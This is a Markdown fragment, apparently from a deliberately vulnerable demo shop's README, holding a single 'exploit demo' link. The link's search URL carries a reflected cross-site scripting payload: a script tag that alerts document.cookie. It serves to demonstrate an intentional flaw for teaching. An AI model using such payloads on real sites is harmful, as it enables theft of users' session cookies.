...
* [exploit demo (<i style="color:red">nothing to see here</i><script>alert('click to check for cookies');alert(document.cookie);)](https://jshop2.herokuapp.com/#/search?q=%3Ci%20style%3D%22color:red%22%3Enothing%20to%20see%20here%3C%2Fi%3E%3Cscript%3Ealert('click%20to%20check%20for%20cookies');alert(document.cookie);)
